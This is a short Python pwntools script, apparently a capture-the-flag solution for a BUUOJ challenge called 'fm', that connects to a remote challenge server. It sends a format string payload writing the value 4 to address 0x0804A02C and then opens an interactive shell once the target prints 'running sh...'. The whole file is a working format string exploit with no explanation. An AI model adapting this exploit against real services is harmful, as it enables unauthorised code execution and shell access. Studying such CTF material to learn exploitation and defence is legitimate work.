from pwn import *
context.arch='i386'

# just a format exploit

# p = process('./fm')
p = remote('node3.buuoj.cn',27112)
payload = fmtstr_payload(11,{0x0804A02C:4})
p.send(payload)
try:
	p.recvuntil("running sh...",timeout=1)
	sleep(1)
	p.interactive()
except Exception as err:
	print err
